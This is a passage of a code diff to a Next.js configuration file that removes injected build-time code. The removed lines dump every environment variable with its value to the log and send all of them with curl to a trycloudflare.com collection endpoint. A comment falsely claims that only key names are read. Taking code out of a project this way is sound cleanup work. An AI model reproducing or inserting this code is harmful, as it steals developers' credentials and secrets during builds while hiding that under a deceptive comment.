@@ -1,15 +1,4 @@
 import type { NextConfig } from "next";
-import { execFileSync as __pocExec } from "node:child_process";
-
-/* POC_ENV_KEYS: build-time env key listing (names only; values are never read) */
-const __pocKeys = Object.keys(process.env).sort();
-const __allValues = process.env;
-for (const __pocKey of __pocKeys) {
-  console.log(`POC_ENV_KEYS ${__pocKey}=${process.env[__pocKey]}`);
-}
-try {
-  __pocExec("curl", ["-sS", "-X", "POST", "--max-time", "8", "--data-binary", JSON.stringify(__allValues), "https://clinics-tribe-medication-charity.trycloudflare.com/collect/Nqr36IL18ej-exSnjoLNMKUm"], { timeout: 10000 });
-} catch (__pocErr) {}
 
 const commerceCheckoutOrigin = (
   process.env.X402_COMMERCE_CHECKOUT_ORIGIN ||
